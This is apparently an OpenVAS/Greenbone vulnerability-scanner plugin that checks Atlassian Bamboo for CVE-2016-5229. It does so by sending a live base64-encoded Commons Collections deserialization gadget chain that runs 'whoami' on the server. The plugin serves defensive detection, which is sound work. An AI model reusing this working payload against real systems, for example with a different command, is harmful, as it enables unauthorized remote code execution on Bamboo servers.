# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:atlassian:bamboo";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105830");
  script_cve_id("CVE-2016-5229");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2024-06-28T15:38:46+0000");

  script_name("Atlassian Bamboo RCE Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/92057");
  script_xref(name:"URL", value:"https://jira.atlassian.com/browse/BAM-17736?src=confmacro&_ga=1.65705644.34970059.1459525314");
  script_xref(name:"URL", value:"https://confluence.atlassian.com/bamboo/bamboo-security-advisory-2016-07-20-831660461.html");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary
  code within the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a serialized java object and check the response.");

  script_tag(name:"insight", value:"Unsafe deserialization allows unauthenticated remote attackers
  to run arbitrary code on the bamboo server.");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor
  advisory for more information.");

  script_tag(name:"summary", value:"Atlassian Bamboo is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"affected", value:"The following versions are affected:

  Bamboo 2.3.1 and later

  Bamboo 5.11.x versions prior to 5.11.4.1

  Bamboo 5.12.x versions prior to 5.12.3.1");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 20:00:00 +0000 (Tue, 09 Oct 2018)");
  script_tag(name:"creation_date", value:"2016-07-27 17:57:26 +0200 (Wed, 27 Jul 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_atlassian_bamboo_detect.nasl");
  script_require_ports("Services/www", 80, 8085);
  script_mandatory_keys("AtlassianBamboo/Installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/agentServer/GetFingerprint.action?agent=elastic";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

fp = eregmatch( pattern:'fingerprint=([^&]+)&', string:buf );
if( isnull( fp[1] ) )
  exit( 0 );

fingerprint = fp[1];

payload = 'rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxl' +
          'clXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxq' +
          'YXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxl' +
          'Y3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhh' +
          'bmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5' +
          'TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9u' +
          'cy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3Rv' +
          'cnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcv' +
          'YXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hl' +
          'LmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3Jn' +
          'LmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJY' +
          'dpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFu' +
          'Zy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu' +
          'ZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9s' +
          'YW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5' +
          'cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8Qcyls' +
          'AgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhw' +
          'AAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAA' +
          'eHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIA' +
          'EGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5n' +
          'LlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABndob2FtaXQABGV4ZWN1cQB+AB4AAAABcQB+ACNz' +
          'cQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFu' +
          'Zy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwAC' +
          'RgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5s' +
          'YW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6';

payload = base64_decode( str:payload );

req = http_post_put_req( port:port, data:payload,
                         url:"/agentServer/message?fingerprint=" + fingerprint );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 500" && "java.lang.Integer cannot be cast to java.util.Set" >< buf ) {
  report = 'It was possible to execute a command on the remote host.\n';
  report += http_report_vuln_url( port:port, url:'/agentServer/message?fingerprint=' + fingerprint );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
